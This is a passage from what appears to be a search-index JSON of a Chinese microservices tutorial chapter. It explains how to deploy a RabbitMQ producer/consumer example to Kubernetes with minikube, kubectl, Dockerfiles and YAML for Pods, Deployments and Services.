\u7684\u6807\u51c6\u66b4\u9732\u65b9\u5f0f\uff0c\u53ef\u4ee5\u5728\u96c6\u7fa4\u5916\u90e8\u8bbf\u95ee\u3002\u53ef\u4ee5\u7528\u4e8e\u751f\u4ea7\u73af\u5883\u3002\u5177\u4f53\u914d\u7f6e\u53d6\u51b3\u4e8e\u4e91\u670d\u52a1\u5546\u3002Minikube \u652f\u6301\u8fd9\u4e2a\u7c7b\u578b\u3002 \u4f7f\u7528 LoadBalancer \u65f6\uff0c\u670d\u52a1\u63d0\u4f9b\u8005\u4f1a\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a\u8d1f\u8f7d\u5747\u8861\u5668\uff0c\u8fd9\u4e2a\u8d1f\u8f7d\u5747\u8861\u5668\u4f1a\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230\u96c6\u7fa4\u4e2d\u7684 Pod\u3002 \u6211\u4eec\u53ef\u4ee5\u4fee\u6539 service \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5c06 type \u6539\u4e3a LoadBalancer\u3002\u79fb\u9664 NodePort\u3002 apiVersion: v1 kind: Service metadata: name: producer-service spec: selector: app: producer ports: - port: 3000 targetPort: 3000 type: LoadBalancer \u7136\u540e\uff0c\u6211\u4eec\u5fc5\u987b\u5f00\u542f tunnel\uff0c\u8fd9\u548c\u4e0a\u9762\u7684 NodePort \u539f\u56e0\u4e00\u6837\uff0c\u4f46\u662f minikube \u4e3a load balancer \u63d0\u4f9b\u4e86 tunnel \u529f\u80fd\uff0c\u53ef\u4ee5\u76f4\u63a5\u628a\u865a\u62df\u673a\u7684\u7aef\u53e3\u6620\u5c04\u5230\u672c\u5730\u3002 minikube tunnel \u6b64\u65f6\u53ef\u4ee5\u4f7f\u7528 kubectl get svc \u6765\u67e5\u770b\u670d\u52a1\u7684\u72b6\u6001\uff0c\u5f53\u5bf9\u5e94\u670d\u52a1 EXTERNAL-IP \u53d8\u4e3a\u4e00\u4e2a IP \u5730\u5740\u65f6\uff0c\u5c31\u53ef\u4ee5\u8bbf\u95ee\u8fd9\u4e2a IP \u5730\u5740\u4e86\u3002\u4f7f\u7528 {EXTERNAL-IP}:{PORT}/apple \u5373\u53ef\u8bbf\u95ee\u3002\u8fd9\u91cc\u7684\u7aef\u53e3\u662f\u4e0a\u6587\u914d\u7f6e\u6587\u4ef6\u4e2d port \u5bf9\u5e94\u7684\u7aef\u53e3\u3002\u5982\u679c\u6ca1\u6709\u5f00\u542f tunnel\uff0cEXTERNAL-IP \u4f1a\u4e00\u76f4\u662f pending\u3002","title":"k8s \u65e0\u72b6\u6001\u670d\u52a1\u57fa\u672c\u90e8\u7f72"},{"location":"20/#ch20-k8s","text":"\u7ec8\u4e8e\u6765\u5230\u4e86\u672c\u7cfb\u5217\u7b2c\u4e8c\u4e2a\u91cd\u70b9\uff0ckubernetes\uff0c\u7b80\u79f0 k8s\u3002 \u901a\u8fc7\u6211\u4eec\u524d\u9762\u7684\u5b66\u4e60\uff0c\u6211\u4eec\u4e86\u89e3\u4e86\u5fae\u670d\u52a1\u67b6\u6784\u7684\u57fa\u672c\u6982\u5ff5\u3002\u4f46\u662f\uff0c\u6bcf\u4e2a\u5fae\u670d\u52a1\u90fd\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u670d\u52a1\uff0c\u5b83\u4eec\u9700\u8981\u72ec\u7acb\u90e8\u7f72\u3001\u72ec\u7acb\u6269\u5c55\u3001\u72ec\u7acb\u76d1\u63a7\u3002 \u5bb9\u5668\u5316\u6280\u672f\u89e3\u51b3\u4e86\u670d\u52a1\u7684\u72ec\u7acb\u90e8\u7f72\u95ee\u9898\uff0c\u800c k8s \u5219\u89e3\u51b3\u4e86\u670d\u52a1\u7684\u72ec\u7acb\u6269\u5c55\u3001\u72ec\u7acb\u76d1\u63a7\u95ee\u9898\u3002k8s \u5c31\u662f\u4e00\u4e2a\u5bb9\u5668\u7684\u7ba1\u7406\u5e73\u53f0\uff0c\u5b83\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u7ba1\u7406\u5927\u91cf\u7684\u5bb9\u5668\uff0c\u8ba9\u6211\u4eec\u53ef\u4ee5\u66f4\u52a0\u65b9\u4fbf\u5730\u90e8\u7f72\u3001\u6269\u5c55\u3001\u76d1\u63a7\u6211\u4eec\u7684\u670d\u52a1\u3002","title":"\u5fae\u670d\u52a1\u901f\u6210 Ch20 k8s \u65e0\u72b6\u6001\u670d\u52a1\u57fa\u672c\u90e8\u7f72"},{"location":"20/#minikube","text":"k8s \u6709\u8bb8\u591a\u4e2a\u5b9e\u73b0\uff0c\u751f\u4ea7\u73af\u5883\u4e2d\u5c31\u662f\u4f7f\u7528\u7684 k8s\uff0c\u4f46\u662f\u5728\u5f00\u53d1\u73af\u5883\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 minikube \u6765\u6a21\u62df\u4e00\u4e2a k8s \u96c6\u7fa4\u3002k3s \u662f\u53e6\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u7684 k8s \u5b9e\u73b0\uff0c\u4f46\u662f\u5b83\u9700\u8981\u4f9d\u8d56\u4e8e linux \u865a\u62df\u673a\u3002 \u4e0d\u8fc7\uff0cminikube \u53ea\u80fd\u5efa\u7acb\u4e00\u4e2a\u5355\u8282\u70b9\u7684 k8s \u96c6\u7fa4\uff0c\u6240\u4ee5\u5b83\u53ea\u9002\u5408\u7528\u6765\u5b66\u4e60\u548c\u5f00\u53d1\u3002\u5982\u679c\u4f60\u8981\u8fdb\u5165\u751f\u4ea7\u73af\u5883\uff0c\u8bf7\u81ea\u884c\u914d\u7f6e k8s \u96c6\u7fa4\u3002\u4f46\u662f\u6ce8\u610f\uff0c\u8fd9\u91cc\u6211\u4eec\u5b66\u7684\u6240\u6709\u5185\u5bb9\u90fd\u4e0d\u4f1a\u6539\u53d8- \u9664\u4e86 minikube \u9650\u5b9a\u7684\u3002\u6700\u5927\u7684\u533a\u522b\u53ea\u4e0d\u8fc7\u662f\u767b\u9646\u96c6\u7fa4\u65f6\uff0c\u4f60\u8981\u4f7f\u7528 ssh \u800c\u4e0d\u662f minikube ssh\u3002\u6b64\u5916\uff0c\u5728\u8bbf\u95ee\u670d\u52a1\u65f6\uff0c\u4f60\u4e5f\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\uff0c\u4e0d\u9700\u8981 minikube \u7684\u4e00\u4e9b\u7279\u6b8a\u64cd\u4f5c\u3002\u603b\u800c\u8a00\u4e4b\uff0c\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u7684\u4f7f\u7528\u5176\u5b9e\u66f4\u7b80\u5355\u4e00\u4e9b\uff0c\u800c\u4e14\u88ab\u6211\u4eec\u7684\u6240\u6709\u5185\u5bb9\u5305\u542b\u3002 \u53c2\u8003 \u6587\u6863 \u5b89\u88c5\u5373\u53ef\u3002 \u4f7f\u7528 minikube start \u5373\u53ef\u542f\u52a8\u4e00\u4e2a k8s \u96c6\u7fa4\u3002 minikube stop \u53ef\u4ee5\u505c\u6b62\u96c6\u7fa4\u3002 minikube pause \u53ef\u4ee5\u6682\u505c\u96c6\u7fa4\u3002 minikube unpause \u53ef\u4ee5\u6062\u590d\u96c6\u7fa4\u3002 minikube delete \u53ef\u4ee5\u5220\u9664\u96c6\u7fa4\u3002 minikube dashboard \u53ef\u4ee5\u6253\u5f00 k8s \u7684 dashboard\uff0c\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e2d\u67e5\u770b\u96c6\u7fa4\u7684\u72b6\u6001\u3002\u8fd9\u4e2a\u547d\u4ee4\u884c\u8981\u4fdd\u6301\u8fd0\u884c\uff0c\u5426\u5219 dashboard \u4f1a\u5173\u95ed\u3002 minikube \u672c\u8eab\u4e5f\u662f\u4e00\u4e2a docker \u5bb9\u5668\uff0c\u5728 docker \u4e2d\u4f1a\u663e\u793a\u51fa\u6765\u3002","title":"minikube"},{"location":"20/#kubectl","text":"minikube \u53ea\u662f\u542f\u52a8\u4e86\u4e00\u4e2a\u5bb9\u5668\u96c6\u7fa4\uff0c\u7ba1\u7406\u8fd9\u4e2a\u96c6\u7fa4\u7684\u5de5\u5177\u662f kubectl\u3002kubectl \u662f k8s \u7684\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u53ef\u4ee5\u7528\u6765\u7ba1\u7406 k8s \u96c6\u7fa4\u3002 \u4f60\u53ef\u4ee5\u4f7f\u7528 kubectl config current-context \u6765\u67e5\u770b\u5f53\u524d kubectl \u64cd\u4f5c\u7684\u96c6\u7fa4\u3002","title":"Kubectl"},{"location":"20/#k8s","text":"\u4e4b\u524d\u5728 Spring Cloud \u90e8\u5206\uff0c\u6211\u4eec\u8981\u4f7f\u7528\u8bb8\u591a\u4e2d\u95f4\u4ef6\uff0c\u4f8b\u5982 Consul \u7b49\u3002\u8fd9\u4e9b\u4e2d\u95f4\u4ef6\u7684\u529f\u80fd\u5f88\u591a\u90fd\u5728 k8s \u5185\u7f6e\u4e86\u3002\u4f8b\u5982\uff0ck8s \u6709\u81ea\u5df1\u7684\u670d\u52a1\u53d1\u73b0\u673a\u5236\uff0c\u6709\u81ea\u5df1\u7684\u914d\u7f6e\u4e2d\u5fc3\uff0c\u6709\u81ea\u5df1\u7684\u8d1f\u8f7d\u5747\u8861\u7b49\u7b49\u3002 \u73b0\u5728\u6211\u4eec\u5148\u5b9e\u73b0\u4e00\u4e2a\u7b80\u5355\u7684\u5fae\u670d\u52a1\u9879\u76ee\u3002\u8fd9\u91cc\u6211\u4eec\u7528\u4e00\u4e2a\u7b80\u5355\u7684\u5e26\u6d88\u606f\u961f\u5217\u7684\u9879\u76ee\u6765\u6f14\u793a\u3002\u6ce8\u610f\uff0c\u6211\u4eec\u6240\u6709\u7684\u9879\u76ee\u90fd\u8981\u53d8\u6210 docker \u5bb9\u5668\u3002","title":"k8s \u5fae\u670d\u52a1\u9879\u76ee\u7684\u5b9e\u73b0"},{"location":"20/#producer","text":"\u9996\u5148\uff0c\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u751f\u4ea7\u8005\u9879\u76ee\u3002\u8fd9\u4e2a\u9879\u76ee\u4f1a\u5411\u6d88\u606f\u961f\u5217\u53d1\u9001\u6d88\u606f\u3002 \u5728 Javascript \u4e2d\uff0c\u4f7f\u7528 amqplib \u5e93\u6765\u64cd\u4f5c RabbitMQ\u3002 import { Hono } from 'hono' import { connect } from 'amqplib' const mq = \"amqp://user:password@message-queue:5672\" async function connectMq() { const connection = await connect(mq) const channel = await connection.createChannel() await channel.assertQueue('food') return channel } const channel = connectMq() const app = new Hono() app.get('/apple', async (c) => { const ch = await channel ch.sendToQueue('food', Buffer.from('apple')) return c.json({ message: 'apple sent' }) }) app.get('/strawberry/:count?', async (c) => { const ch = await channel const count = Number.parseInt(c.req.param('count') || '1') Array.from({ length: count }).forEach(() => { ch.sendToQueue('food', Buffer.from('strawberry')) }) return c.json({ message: 'strawberry sent', count }) }) export default app \u8fd9\u91cc :count? \u8868\u793a count \u662f\u53ef\u9009\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u8bbf\u95ee /strawberry \u6216\u8005 /strawberry/3 \u3002 URL \u91cc\u5730\u5740\u4f7f\u7528\u7684 message-queue \uff0c\u8fd9\u4e2a\u5c06\u662f\u6211\u4eec k8s \u96c6\u7fa4\u4e2d\u7684\u6d88\u606f\u961f\u5217\u7684\u5730\u5740\u3002\u6211\u4eec\u4f1a\u5728\u540e\u9762\u521b\u5efa\u8fd9\u4e2a\u6d88\u606f\u961f\u5217\u3002 \u7136\u540e\u6211\u4eec\u9700\u8981\u7f16\u5199 Dockerfile\u3002 FROM oven/bun:slim COPY . /app WORKDIR /app RUN bun install CMD bun run ./src/index.ts","title":"Producer"},{"location":"20/#consumer","text":"\u7136\u540e\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u6d88\u8d39\u8005\u9879\u76ee\u3002\u8fd9\u4e2a\u9879\u76ee\u4f1a\u4ece\u6d88\u606f\u961f\u5217\u4e2d\u63a5\u6536\u6d88\u606f\u3002 import { Hono } from 'hono' import { connect } from 'amqplib' const mq = \"amqp://user:password@message-queue:5672\" async function connectMq() { const connection = await connect(mq) const channel = await connection.createChannel() await channel.assertQueue('food') return channel } const channelPromise = connectMq() const messageQueue: string[] = [] const app = new Hono() app.get('/ping', async (c) => { return c.json({ message: 'pong' }) }) channelPromise.then((ch) => { // adds to the messageQueue array endlessly ch.consume('food', (msg) => { if (msg) { messageQueue.push(msg.content.toString()) } }, { noAck: true }) }) app.get('/food', async (c) => { return c.json({ messageQueue }) }) export default app \u8fd9\u91cc\u7684 ack \u8868\u793a\u786e\u8ba4\u6536\u5230\u6d88\u606f\u3002\u8fd9\u4e2a\u6b65\u9aa4\u4e4b\u524d\u5728 Spring \u4e2d\u88ab\u81ea\u52a8\u5904\u7406\u4e86\u3002\u6211\u4eec\u5728\u8fd9\u91cc\u5f00\u542f noAck \uff0c\u4ee3\u8868\u4e0d\u786e\u8ba4\uff0c\u76f4\u63a5\u63a5\u6536\u3002 Dockerfile \u4e0e\u751f\u4ea7\u8005\u4e00\u6837\u3002","title":"Consumer"},{"location":"20/#k8s_1","text":"\u4e0a\u9762\u6211\u4eec\u5b8c\u6210\u4e86 Producer \u548c Consumer \u4e24\u4e2a\u9879\u76ee\u3002\u6211\u4eec\u9700\u8981\u5c06\u8fd9\u4e24\u4e2a\u9879\u76ee\u7ec4\u7ec7\u5230 k8s \u4e2d\uff0c\u5e76\u6dfb\u52a0\u6d88\u606f\u961f\u5217\u3002\u5728\u90e8\u7f72\u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u4e86\u89e3 k8s \u7684\u4e00\u4e9b\u57fa\u7840\u65e0\u72b6\u6001\u7ec4\u4ef6\u3002\u5404\u4e2a\u7ec4\u4ef6\u7684\u914d\u7f6e\u6587\u4ef6\u53ef\u89c1 \u5b98\u65b9\u6587\u6863 \u3002","title":"k8s \u57fa\u7840\u65e0\u72b6\u6001\u7ec4\u4ef6"},{"location":"20/#pod","text":"Pod \u662f k8s \u7684\u6700\u5c0f\u5355\u5143\u3002\u4e00\u4e2a Pod \u53ef\u4ee5\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u5bb9\u5668\u3002\u5728\u6211\u4eec\u7684\u4f8b\u5b50\u4e2d\uff0cProducer \u548c Consumer \u90fd\u662f\u4e00\u4e2a\u5bb9\u5668\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5c06\u5b83\u4eec\u653e\u5728\u4e00\u4e2a Pod \u4e2d\u3002 k8s \u7684\u914d\u7f6e\u6587\u4ef6\u662f yaml \u683c\u5f0f\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a pod.yaml \u6587\u4ef6\u3002 apiVersion: v1 kind: Pod metadata: name: producer-consumer spec: containers: - name: producer image: producer ports: - containerPort: 3000 resources: requests: memory: \"64Mi\" cpu: \"250m\" limits: memory: \"128Mi\" cpu: \"500m\" - name: consumer image: consumer ports: - containerPort: 3000 resources: requests: memory: \"64Mi\" cpu: \"250m\" limits: memory: \"128Mi\" cpu: \"500m\" \u5bf9\u4e8e k8s \u914d\u7f6e\u7684\u8bed\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u53c2\u8003 \u6587\u6863 \u3002\u5177\u4f53\u800c\u8a00\uff0c\u4e00\u4e2a Pod \u914d\u7f6e\u6587\u4ef6\u5305\u542b\u4e86 apiVersion, kind, metadata, spec \u56db\u4e2a\u90e8\u5206\u3002 apiVersion \u8868\u793a k8s \u7684 api \u7248\u672c\u3002 kind \u8868\u793a\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u7684\u7c7b\u578b\uff0c\u8fd9\u91cc\u662f Pod\u3002 metadata \u5305\u542b\u4e86\u4e00\u4e9b\u5143\u6570\u636e\uff0c\u4f8b\u5982 Pod \u7684\u540d\u5b57\u3002 spec \u5305\u542b\u4e86 Pod \u7684\u914d\u7f6e\uff0c\u4f8b\u5982\u5bb9\u5668\u7684\u914d\u7f6e\u3002 \u5bf9\u4e8e\u4e0d\u540c\u7684\u7ec4\u4ef6\uff0c\u6211\u4eec\u8981\u5b66\u4e60\u7684\u5c31\u662f spec \u90e8\u5206\u7684\u914d\u7f6e\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u914d\u7f6e\u4e86\u4e24\u4e2a\u5bb9\u5668\uff0c\u4e00\u4e2a\u662f Producer\uff0c\u4e00\u4e2a\u662f Consumer\u3002 Pod \u7684 spec \u5982\u4e0b\uff0c containers \u8868\u793a\u5bb9\u5668\u7684\u914d\u7f6e\u3002\u8fd9\u91cc\u6211\u4eec\u914d\u7f6e\u4e86\u4e24\u4e2a\u5bb9\u5668\u3002 name \u8868\u793a\u5bb9\u5668\u7684\u540d\u5b57\u3002 image \u8868\u793a\u5bb9\u5668\u7684\u955c\u50cf\u3002 ports \u8868\u793a\u5bb9\u5668\u4f7f\u7528\u7684 port\uff0c\u8fd9\u91cc\u53ea\u662f\u8fdb\u884c\u8bf4\u660e\uff0c\u5e76\u4e0d\u4f1a\u81ea\u52a8\u6253\u5f00\u7aef\u53e3\u3002ports \u662f\u4e00\u4e2a\u5217\u8868\uff0c\u6bcf\u4e2a\u5143\u7d20\u53ef\u4ee5\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5305\u542b containerPort \u548c protocol \u4e24\u4e2a\u5c5e\u6027\u3002\u4e00\u822c\u800c\u8a00\uff0c\u6211\u4eec\u53ea\u9700\u8981\u914d\u7f6e containerPort\u3002 resources \u8868\u793a\u5bb9\u5668\u7684\u8d44\u6e90\u914d\u7f6e\u3002requests \u8868\u793a\u5bb9\u5668\u7684\u6700\u5c0f\u8d44\u6e90\uff0climits \u8868\u793a\u5bb9\u5668\u7684\u6700\u5927\u8d44\u6e90\u3002\u8fd9\u91cc\u6211\u4eec\u914d\u7f6e\u4e86\u5185\u5b58\u548c CPU \u7684\u8d44\u6e90\u3002\u56e0\u4e3a k8s \u652f\u6301\u81ea\u52a8\u6269\u5c55\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u914d\u7f6e\u8d44\u6e90\uff0c\u4ee5\u907f\u514d\u8d44\u6e90\u8017\u5c3d\u3002 \u4e00\u822c\u800c\u8a00\uff0c\u6211\u4eec\u4e0d\u4f1a\u76f4\u63a5\u4f7f\u7528 Pod\uff0c\u800c\u662f\u4f7f\u7528\u5176\u5b83\u7ec4\u4ef6\u3002\u5176\u5b83\u7ec4\u4ef6\u4f1a\u81ea\u52a8\u521b\u5efa Pod\u3002 \u6ce8\u610f\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0ck8s \u662f\u4ece registry \u83b7\u53d6\u955c\u50cf\uff0c\u5982\u679c\u8981\u4f7f\u7528\u672c\u5730\u955c\u50cf\uff0c\u9700\u8981\u4f7f\u7528 imagePullPolicy: Never \u3002\u5e76\u4e14\u624b\u52a8\u4f7f\u7528 minikube image load im1 im2 im3 \u547d\u4ee4\u52a0\u8f7d\u955c\u50cf\u3002 \u5373\uff0c apiVersion: v1 # ... containers: - name: producer image: producer imagePullPolicy: Never # ... - name: consumer image: consumer imagePullPolicy: Never # ... \u4e14\u8981\u8fd0\u884c\uff0c minikube image load producer:latest consumer:latest \uff0c\u6765\u52a0\u8f7d\u955c\u50cf\u5230 minikube \u4e2d\u3002 \u6216\u8005\uff0c\u4f7f\u7528 minikube image build -t producer . \u6765\u4f7f\u7528 minikube \u7684 docker \u6784\u5efa\u955c\u50cf\u3002\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u624b\u52a8\u52a0\u8f7d\u955c\u50cf\u4e86\u3002 \u5982\u679c\u8981\u5220\u9664\u955c\u50cf\uff0c\u4f7f\u7528 minikube ssh \u8fdb\u5165\u96c6\u7fa4\uff0c\u7136\u540e\u7528 docker \u5220\u9664\u955c\u50cf\u5373\u53ef\u3002","title":"Pod"},{"location":"20/#replicaset","text":"ReplicaSet \u4e00\u822c\u4e0d\u4f1a\u72ec\u7acb\u4f7f\u7528\uff0c\u800c\u662f\u548c Deployment \u4e00\u8d77\u4f7f\u7528\u3002ReplicaSet \u4f1a\u81ea\u52a8\u521b\u5efa Pod\uff0c\u5e76\u4e14\u53ef\u4ee5\u81ea\u52a8\u6269\u5c55 Pod \u7684\u6570\u91cf\u3002\u521b\u5efa Deployment \u65f6\uff0cReplicaSet \u4f1a\u81ea\u52a8\u521b\u5efa\u3002 \u56e0\u4e3a\u6211\u4eec\u4e0d\u4f1a\u76f4\u63a5\u4f7f\u7528 ReplicaSet\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u5176\u914d\u7f6e\u6587\u4ef6\u3002","title":"ReplicaSet"},{"location":"20/#deployment","text":"Deployment \u662f k8s \u7684\u4e00\u4e2a\u63a7\u5236\u5668\uff0c\u5b83\u662f\u4e00\u7ec4 Pod \u7684\u62bd\u8c61\u3002Deployment \u4f1a\u81ea\u52a8\u521b\u5efa Pod\uff0c\u5e76\u4e14\u53ef\u4ee5\u81ea\u52a8\u6269\u5c55 Pod \u7684\u6570\u91cf\u3002\u6b64\u5916\uff0cDeployment \u8fd8\u6709\u81ea\u52a8\u91cd\u8bd5\uff0c\u56de\u6eda\uff0c\u70ed\u66f4\u65b0\u7b49\u529f\u80fd\u3002 \u73b0\u5728\uff0c\u6211\u4eec\u4e3a Producer \u548c Consumer \u5206\u522b\u521b\u5efa\u4e00\u4e2a Deployment\u3002 apiVersion: apps/v1 kind: Deployment metadata: name: producer spec: selector: matchLabels: app: producer template: metadata: labels: app: producer spec: containers: - name: producer image: producer ports: - containerPort: 3000 resources: limits: cpu: \"1\" memory: \"512Mi\" \u5bf9\u4e8e Deployment\uff0cspec \u6709\u4e09\u4e2a\u90e8\u5206\uff0c replicas \u8868\u793a Pod \u7684\u6570\u91cf\u3002 selector \u8868\u793a\u9009\u62e9\u5668\uff0c\u7528\u6765\u9009\u62e9\u54ea\u4e9b Pod \u5c5e\u4e8e\u8fd9\u4e2a Deployment\u3002\u8fd9\u91cc\u6211\u4eec\u9009\u62e9 label \u4e2d app \u503c\u4e3a producer \u7684 Pod\u3002 template \u8868\u793a Pod \u7684\u914d\u7f6e\u6587\u4ef6\u6a21\u7248\u3002\u8fd9\u90e8\u5206\u7684\u914d\u7f6e\u548c Pod \u914d\u7f6e\u4e00\u6837\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u914d\u7f6e RabbitMQ \u548c consumer\u3002 apiVersion: apps/v1 kind: Deployment metadata: name: mq spec: selector: matchLabels: app: mq template: metadata: labels: app: mq spec: containers: - name: mq image: rabbitmq:4.0-rc-management resources: limits: memory: \"128Mi\" cpu: \"500m\" ports: - containerPort: 5672 apiVersion: apps/v1 kind: Deployment metadata: name: mq spec: selector: matchLabels: app: mq template: metadata: labels: app: mq spec: containers: - name: mq image: rabbitmq:4.0-rc-management resources: limits: memory: \"128Mi\" cpu: \"500m\" env: - name: RABBITMQ_DEFAULT_USER value: user - name: RABBITMQ_DEFAULT_PASS value: password ports: - containerPort: 5672 \u6ce8\u610f\uff0c\u8fd9\u91cc\u7684\u8bed\u6cd5\u4e0e docker-compose \u7c7b\u4f3c\u4f46\u4e0d\u5b8c\u5168\u4e00\u6837\u3002","title":"Deployment"},{"location":"20/#service","text":"\u6b64\u524d\u6211\u4eec\u5728 Spring Cloud \u4e2d\uff0c\u670d\u52a1\u53d1\u73b0\u4f7f\u7528\u7684\u662f Consul\u3002Service \u7ec4\u4ef6\u4e5f\u6709\u7c7b\u4f3c\u7684\u529f\u80fd\u3002Service \u662f k8s \u7684\u4e00\u4e2a\u670d\u52a1\u53d1\u73b0\u673a\u5236\u3002Service \u4f1a\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a\u865a\u62df IP\uff0c\u7528\u6765\u4ee3\u7406\u4e00\u7ec4 Pod\u3002\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u865a\u62df IP \u6765\u8bbf\u95ee\u8fd9\u7ec4 Pod\u3002 \u4e0a\u6587\u4e2d\uff0c\u6211\u4eec\u7684 producer \u548c consumer \u90fd\u4f7f\u7528 amqp://user:password@message-queue:5672 \u6765\u8bbf\u95ee\u6d88\u606f\u961f\u5217\u3002\u56e0\u6b64\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a message-queue \u7684 Service\u3002 apiVersion: v1 kind: Service metadata: name: message-queue spec: selector: app: mq ports: - port: 5672 targetPort: 5672 \u8fd9\u91cc selector \u9009\u62e9\u4e86 label \u4e2d app \u503c\u4e3a mq \u7684 Pod\u3002ports \u914d\u7f6e\u4e86\u7aef\u53e3\u6620\u5c04\u3002\u8fd9\u6837\uff0c\u901a\u8fc7\u8bbf\u95ee message-queue:5672 \u5c31\u53ef\u4ee5\u8bbf\u95ee\u5230 mq Pod \u7684 5672 \u7aef\u53e3\u3002\u5982\u679c\u6211\u4eec\u6709\u591a\u4e2a mq Pod\uff0ck8s \u4f1a\u81ea\u52a8\u8d1f\u8f7d\u5747\u8861\u3002 \u6b64\u5916\uff0c\u5982\u679c\u4f60\u60f3\u66b4\u9732\u591a\u4e2a\u7aef\u53e3\uff0c\u6bcf\u4e2a\u7aef\u53e3\u90fd\u8981\u6709\u4e00\u4e2a\u72ec\u7279\u7684 name\u3002 # ... ports: - name: amqp port: 5672 targetPort: 5672 - name: management port: 15672 targetPort: 15672 \u6ce8\u610f\uff0c\u6240\u6709\u7684 deployment\uff0c\u5982\u679c\u9700\u8981\u8bbf\u95ee\uff0c\u65e0\u8bba\u662f\u5185\u90e8\u8fd8\u662f\u5916\u90e8\uff0c\u90fd\u9700\u8981\u521b\u5efa service\u3002\u56e0\u6b64\u6211\u4eec\u8fd8\u9700\u8981\u4e3a producer \u548c consumer \u521b\u5efa service\u3002 Service \u6709\u4e00\u4e2a type \u53c2\u6570\uff0c\u53ef\u4ee5\u52a0\u5728 spec \u4e2d\u3002type \u6709\u56db\u4e2a\u503c\uff0c ClusterIP\uff1a\u9ed8\u8ba4\u503c\uff0c\u521b\u5efa\u4e00\u4e2a\u865a\u62df IP\uff0c\u53ea\u80fd\u5728\u96c6\u7fa4\u5185\u90e8\u8bbf\u95ee\u3002 NodePort\uff1a\u5c06\u96c6\u7fa4\u7684\u7aef\u53e3\u6620\u5c04\u5230 Node \u7684\u7aef\u53e3\u4e0a\uff0c\u53ef\u4ee5\u5728\u96c6\u7fa4\u5916\u90e8\u8bbf\u95ee\u3002\u4e00\u822c\u7528\u4e8e\u6d4b\u8bd5\u3002 LoadBalancer\uff1a\u521b\u5efa\u4e00\u4e2a\u8d1f\u8f7d\u5747\u8861\u5668\uff0c\u53ef\u4ee5\u5728\u96c6\u7fa4\u5916\u90e8\u8bbf\u95ee\u3002\u5177\u4f53\u914d\u7f6e\u53d6\u51b3\u4e8e\u4e91\u670d\u52a1\u5546\u3002Minikube \u652f\u6301\u8fd9\u4e2a\u7c7b\u578b\uff0c\u5b83\u7684\u884c\u4e3a\u5373\u53ef\u4ee5\u901a\u8fc7 minikube \u547d\u4ee4\u66b4\u9732\u7aef\u53e3\u3002 ExternalName\uff1a\u5c06 Service \u6620\u5c04\u5230\u4e00\u4e2a\u5916\u90e8\u57df\u540d\u3002 \u4e4b\u540e\u6211\u4eec\u4f1a\u5728\u90e8\u7f72\u65f6\u4ecb\u7ecd\u5b83\u4eec\u7684\u4f7f\u7528\u3002\u73b0\u5728\u6211\u4eec\u5148\u4fdd\u7559\u9ed8\u8ba4\u503c\u3002 \u6ce8\u610f\uff0c\u6211\u4eec\u5728\u4e0b\u6587\u4e2d\u4fee\u6539 message queue \u65f6\uff0c\u5f88\u53ef\u80fd\u4e0d\u4f1a\u4fee\u6539 producer \u548c consume\u3002\u8fd9\u65f6\uff0c\u7a0b\u5e8f\u91cc\u7684 channel \u4f1a\u4fdd\u6301\u8fde\u63a5\uff0c\u4f46\u4e8b\u5b9e\u4e0a\u5df2\u7ecf\u5931\u6548\u3002\u8fd9\u4f1a\u5bfc\u81f4 producer \u548c consumer \u65e0\u6cd5\u8bbf\u95ee\u5230\u65b0\u7684 message queue\u3002\u8fd9\u65f6\uff0c\u6211\u4eec\u9700\u8981\u91cd\u542f producer \u548c consumer\u3002\u91cd\u542f\u65b9\u6cd5\u662f\u4f7f\u7528\u547d\u4ee4 kubectl rollout restart deployment producer \u3002","title":"Service"},{"location":"20/#k8s_2","text":"\u73b0\u5728\uff0c\u6211\u4eec\u6709\u4e86 6 \u4e2a\u914d\u7f6e\u6587\u4ef6\uff0c\u5206\u522b\u662f producer, consumer, mq, producer-service, consumer-service, mq-service\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 kubectl apply -f \u547d\u4ee4\u6765\u90e8\u7f72\u8fd9\u4e9b\u914d\u7f6e\u6587\u4ef6\u3002\u8be5\u547d\u4ee4\u53ef\u5728\u540e\u9762\u52a0\u6587\u4ef6\u5939\u540d\uff0c\u4f1a\u81ea\u52a8\u90e8\u7f72\u6587\u4ef6\u5939\u4e0b\u7684\u6240\u6709\u914d\u7f6e\u6587\u4ef6\u3002\u6216\u8005\u52a0\u6587\u4ef6\u540d\uff0c\u4f1a\u90e8\u7f72\u5355\u4e2a\u6587\u4ef6\u3002 kubectl apply -f . \u73b0\u5728\uff0c\u5c31\u53ef\u4ee5\u5728 dashboard \u4e2d\u770b\u5230 pod \u548c\u4e4b\u524d\u6211\u4eec\u5b9a\u4e49\u7684\u6240\u6709\u7684 service \u7b49\u3002 